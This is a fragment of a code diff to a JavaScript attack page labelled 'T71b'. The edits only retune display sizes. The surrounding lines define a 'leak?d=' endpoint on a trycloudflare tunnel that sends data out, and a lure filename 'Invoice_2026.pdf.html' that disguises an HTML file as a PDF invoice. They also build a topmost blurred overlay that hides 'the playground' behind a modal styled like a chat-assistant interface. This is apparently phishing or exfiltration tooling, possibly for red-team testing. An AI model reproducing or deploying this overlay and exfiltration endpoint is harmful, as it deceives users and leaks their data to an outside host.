@@ -16,7 +16,7 @@
   /* APP HEIGHT DIAL - set a number (px) for a manual exact fit of your
      browser window, or leave null for auto (screen.availHeight - 120).
      Try ~650-750 on a MacBook if auto is too tall. */
-  var TARGET_PX = 1460;
+  var TARGET_PX = 1455;
   var R = "https://uniform-var-laura-cpu.trycloudflare.com/leak?d=";
   var FNAME = "Invoice_2026.pdf.html";
   function log(m) { try { console.log("[T71b] " + m + " @" + Date.now()); } catch (e) {} }
@@ -98,7 +98,7 @@
   css.textContent = [
     /* opaque, blurred backdrop - the playground is invisible behind it */
     "#t71b-ov{position:fixed;inset:0;z-index:2147483647;background:rgba(13,13,13,.97);backdrop-filter:blur(28px);display:flex;align-items:center;justify-content:center;font-family:'Sohne',-apple-system,BlinkMacSystemFont,'Segoe UI',Helvetica,Arial,sans-serif}",
-    "#t71b-modal{position:relative;width:100%;max-width:1400px;box-sizing:border-box;background:#212121;border:1px solid rgba(255,255,255,.07);border-radius:24px;padding:32px 40px 36px;box-shadow:0 24px 64px rgba(0,0,0,.5);text-align:center;color:#fff}",
+    "#t71b-modal{position:relative;width:100%;max-width:760px;box-sizing:border-box;background:#212121;border:1px solid rgba(255,255,255,.07);border-radius:24px;padding:32px 40px 36px;box-shadow:0 24px 64px rgba(0,0,0,.5);text-align:center;color:#fff}",
     "#t71b-x{position:absolute;top:14px;right:16px;width:28px;height:28px;border:none;background:transparent;color:#fff;font-size:18px;line-height:28px;cursor:pointer;border-radius:999px}",
     "#t71b-x:hover{background:rgba(255,255,255,.1)}",
     "#t71b-modal h1{font-size:24px;font-weight:600;line-height:1.3;margin:0 10px;color:#fff}",
